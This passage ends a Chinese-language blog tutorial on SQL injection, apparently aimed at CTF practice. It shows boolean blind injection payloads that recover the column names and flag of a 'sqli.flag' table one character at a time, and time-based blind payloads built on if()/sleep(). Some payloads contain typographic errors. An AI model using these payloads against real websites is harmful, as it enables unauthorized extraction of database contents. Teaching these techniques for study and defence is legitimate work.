+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第一列列名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> columns <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第二列列名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#当前库sqli表flag有两个列‘id’和‘flag’，列名长度为<span class="number">2</span>和<span class="number">4</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>根据列名长度爆破列名</strong></p>
+<p>操作同对当前库爆表名的步骤，i是列标-1，j是字符下标</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘a’</span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘i’</span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第一列列名第一个字符为i</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’ limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span>‘g’</span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的第二列列名第四个字符为g</span><br><span class="line"></span><br><span class="line">#当前库sqli表flag有两个列‘id’和‘flag’</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>根据列名爆破数据</strong></p>
+<p>flag有固定的格式，以右大括号结束，假设flag有小写英文字母、下划线、花括号构成，由于不知道flag长度，要一个无限循环，定义计数符j，内嵌循环i遍历小写、下划线和花括号，匹配到字符后j++，出循环的条件是当前i是右花括号，即flag结束</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>，<span class="number">1</span>)<span class="operator">=</span>“a”</span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),<span class="number">1</span>，<span class="number">1</span>)<span class="operator">=</span>“c”</span><br><span class="line">#query_success</span><br><span class="line">#flag的第一个字符是c</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> sqli.flag),i，<span class="number">1</span>)<span class="operator">=</span>“&#125;”</span><br><span class="line">#query_success</span><br><span class="line">#flag的最后一个字符是&#125;</span><br><span class="line">#这里的j是计数变量j从<span class="number">1</span>自增<span class="number">1</span>得到的值</span><br><span class="line"></span><br><span class="line">#出循环即可得到flag</span><br></pre></td></tr></table></figure>
+<h3 id="时间盲注">时间盲注</h3>
+<h4 id="判断长度">判断长度</h4>
+<p>利用MySQL的 if() 和 sleep() 判断查询结果的长度，从1开始判断，并依次递增。</p>
+<p><code>?id=1' and if((length(查询语句) =1), sleep(5), 3)</code><br>
+如果页面响应时间超过5秒，说明长度判断正确，则sleep(5);<br>
+如果页面响应时间不超过5秒（正常响应），说明长度判断错误，继续递增判断长度。</p>
+<p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240715154806735.png" alt="image-20240715154806735"></p>
+<h4 id="枚举字符">枚举字符</h4>
+<p>利用MySQL的 if() 和 sleep() 判断字符的内容。<br>
+从查询结果中截取第一个字符，转换成ASCLL码，从32开始判断，递增至126。<br>
+关于ASCLL码可参考我的另一篇文章：ASCLL编码对照表</p>
+<p><code>?id=1' and if((ascii(substr(查询语句,1,1)) =1), sleep(5), 3) </code><br>
+如果页面响应时间超过5秒，说明字符内容判断正确；<br>
+如果页面响应时间不超过5秒（正常响应），说明字符内容判断错误，递增猜解该字符的其他可能性。</p>
+<p>第一个字符猜解成功后，依次猜解第二个、第三个……第n个（n表示返回结果的长度）。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c3ngh.top">C3ngH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c3ngh.top/2024/07/15/newsql/">http://c3ngh.top/2024/07/15/newsql/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c3ngh.top" target="_blank">C3ngH's B10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/05/25/RCE/" title="RCE（重构版）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RCE（重构版）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/02/02/CrossSiteScripting/" title="XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-02</div><div class="title">XSS注入</div></div></a></div><div><a href="/2024/02/14/FileInclude/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件包含</div></div></a></div><div><a href="/2024/02/14/FileUpload/" title="文件上传"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件上传</div></div></a></div><div><a href="/2024/03/18/PHPunserialize/" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/2024/05/25/RCE/" title="RCE（重构版）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-25</div><div class="title">RCE（重构版）</div></div></a></div><div><a href="/2024/01/29/SQLinjection/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-29</div><div class="title">SQL注入</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C3ngH</div><div class="author-info__description">允许一切如其所是</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zch050217"><i class="fab fa-github"></i><span>关注作者</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/zch050217" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zch050217@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%88%E5%9B%9E%E6%98%BE%E6%AD%A3%E5%B8%B8%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">联合查询注入（回显正常）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">找到注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">测试注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.3.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5"><span class="toc-number">1.4.</span> <span class="toc-text">确定字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.5.</span> <span class="toc-text">联合查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8F%AA%E5%9B%9E%E6%98%BE%E5%BC%82%E5%B8%B8%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">报错注入（只回显异常）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">floor() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">extractvalue() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">updatexml() 函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%8F%AA%E8%BF%94%E5%9B%9E%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">布尔盲注（只返回查询是否成功）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.2.</span> <span class="toc-text">盲注步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%95%BF%E5%BA%A6"><span class="toc-number">4.1.</span> <span class="toc-text">判断长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%AD%97%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">枚举字符</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/15/newsql/" title="SQL注入（重构版）">SQL注入（重构版）</a><time datetime="2024-07-15T06:00:39.000Z" title="发表于 2024-07-15 14:00:39">2024-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/25/RCE/" title="RCE（重构版）">RCE（重构版）</a><time datetime="2024-05-25T03:03:50.000Z" title="发表于 2024-05-25 11:03:50">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/25/rkwg3/" title="广域通信网">广域通信网</a><time datetime="2024-05-25T03:00:15.000Z" title="发表于 2024-05-25 11:00:15">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/16/MiscLearn/" title="Misc学习记录（未整理）">Misc学习记录（未整理）</a><time datetime="2024-05-16T03:10:19.000Z" title="发表于 2024-05-16 11:10:19">2024-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/22/IDAuse/" title="IDA使用指南">IDA使用指南</a><time datetime="2024-04-22T14:11:05.000Z" title="发表于 2024-04-22 22:11:05">2024-04-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/BGimg.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By C3ngH</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+
+  const initWaline = (Fn) => {
+    const waline = Fn(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://blog-waline-weld.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+
+    const destroyWaline = () => {
+      waline.destroy()
+    }
+
+    btf.addGlobalFn('pjax', destroyWaline, 'destroyWaline')
+  }
+
+  const loadWaline = async () => {
+    if (initFn) initWaline(initFn)
+    else {
+      await getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.css')
+      const { init } = await import('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.js')
+      initFn = init || Waline.init
+      initWaline(initFn)
+      window.walineFn = initFn
+    }
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
